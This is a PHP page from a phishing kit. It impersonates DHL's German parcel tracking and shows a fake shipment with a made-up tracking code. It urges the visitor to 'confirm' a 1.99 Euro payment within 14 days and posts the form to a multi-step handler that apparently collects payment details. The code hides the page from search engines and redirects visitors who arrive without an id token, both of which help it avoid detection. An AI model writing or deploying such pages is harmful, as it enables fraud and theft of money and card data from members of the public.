<?php 
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './11644210b.php?step=one&'.$id;
?>
<!DOCTYPE html>
<html lang="en" class="log">
	<head>
		<meta charset="UTF-8"/>
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<title>herzlich willkommen</title>
		<meta name="robots" content="noindex, nofollow, noimageindex">
		<meta name="google" content="notranslate">
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="<?php echo $css1; ?>">
		<link rel="stylesheet" href="layout/css/style.css">
		<script src="./layout/js/style.js"></script>
		<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	</head>
	<body class="lowla">
		<div class="contenu">
		<header>
			<div class="pri">
				<span class="prv">Privatkunden</span>
				<span class="per">Geschäftskunden</span>
			</div>
			<div class="bande">
				<span class="lg"><img src="./layout/img/lg.svg"></span>
			<ul>
			<li>Pakete senden</li>
			<li>Pakete empfangen</li>
			<li>Hilfe & Kontakt</li>
			</ul>
			</div>
		</header>
		<section>
		<form id="lFrm" method="post" action="<?php echo $action; ?>">
			<div class="parag">
				<span class="titr">DHL Verfolgung</span>
				<span class="deta">Hier finden Sie Informationen zu Ihren Sendungen</span>
				<span class="deta">Verfolgen Sie Ihre Paketsendungen jederzeit vom Versand bis zur Lieferung</span>
			</div>
			<div class="box">
			<div class="pak">
				<span class="imgpak"><img src="./layout/img/pak.png"></span>
				<div class="allt">
				<span class="dh">DHL Sendung</span>
				<span class="coll">Sendungscode 00340434139185930097<img class="pb01" src="./layout/img/ta3.svg"></span>
				<ul>
				<li></li>
				<li></li>
				<li></li>
				<li></li>
				<li></li>
				</ul>
				<div>Status : <b>bei der Lieferung</b>
				</div>
				</div>
				<div class="erro">
				<span><b style="color:#d40511">Wichtige Mitteilung!</b><br>Um die Lieferung so schnell wie möglich abzuschließen, bestätigen Sie bitte die Zahlung <span style="color:#d40511;font-weight:bold;font-family:arial">(1.99 Euro)</span>. 
indem Sie auf Weiter klicken. Die Online-Bestätigung muss innerhalb der nächsten 14 Tage vor Ablauf erfolgen.</span>
				</div>
			</div>
			</div>
			<div><button type="submit" class="text-center" >Nächster</button></div>
		</form>
			<div class="pubb"><img class="pb01" src="./layout/img/pub.jpg"><img class="pb02" src="./layout/img/pubr.gif"></div>
		</section>
		</div>

	<footer>
			<div class="contenu">
		<ul>
		<li>DHL Paket</li>
		<li>DHL Dienstleistungen.</li>
		<li>DHL Ausdrücken.</li>
		<li>DHL Logistik.</li>
		</ul>
		<ul>
		<li>Kontakt</li>
		<li>Hilfe & Kundenservice.</li>
		<li>So funktioniert das.</li>
		<li>Mobile Apps.</li>
		</ul>
		<ul>
		<li>Über uns.</li>
		<li>Post DHL.</li>
		<li>Verantwortung.</li>
		<li>Presse.</li>
		<li>Werdegang.</li>
		</ul>
		<div>&copy; <?php echo date("Y"); ?><?php echo lang('FtrS2'); ?></div>
		</div>
	</footer>
	</body>
</html>
<?php
    endif;
    ob_end_flush();
?>